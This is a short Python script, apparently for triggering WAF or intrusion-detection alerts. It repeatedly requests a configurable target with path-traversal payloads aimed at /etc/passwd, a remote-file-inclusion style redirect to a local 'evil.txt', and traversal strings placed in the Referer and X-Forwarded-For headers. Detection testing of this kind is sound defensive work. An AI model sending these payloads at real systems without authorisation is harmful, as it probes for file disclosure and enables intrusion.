import requests

import os
from dotenv import load_dotenv
load_dotenv()

TARGET_URL = os.getenv("TARGET_URL")

# List of URLs to visit
urls = [
    f"{TARGET_URL}/#/download/../../../../etc/passwd",
    f"{TARGET_URL}/#/?file=/../../../../etc/passwd",
    f"{TARGET_URL}/#/page=/../../../../etc/passwd",
    f"{TARGET_URL}/ftp/../../../../etc/passwd",
    f"{TARGET_URL}//#/redirect?to=../../../../etc/passwd",
    f"{TARGET_URL}/redirect?to=http://127.0.0.1/evil.txt"
]

# Headers designed to mimic and trigger LFI/RFI detection signatures
headers = {
    # Using a standard browser base but adding a PHP system command or wrapper pattern
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    
    # Simulating RFI/LFI injection inside the Referer header (often monitored by WAFs)
    "Referer": "http://127.0.0.1/evil.txt",
    
    # Injecting common traversal sequences into an IP-forwarding header
    "X-Forwarded-For": "../../../etc/passwd",
    
    # Simulating a payload in the Accept-Encoding or custom header if needed
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

def visit_urls():
    for url in urls:
        print(f"[*] Visiting URL: {url}")
        
        # Visit the URL 3 times with the WAF-triggering headers
        for i in range(1, 4):
            try:
                response = requests.get(url, headers=headers, timeout=10)
                print(f"    Attempt {i}: Status Code {response.status_code} | Bytes: {len(response.content)}")
            except requests.exceptions.RequestException as e:
                print(f"    Attempt {i}: Failed to connect - {e}")

if __name__ == "__main__":
    visit_urls()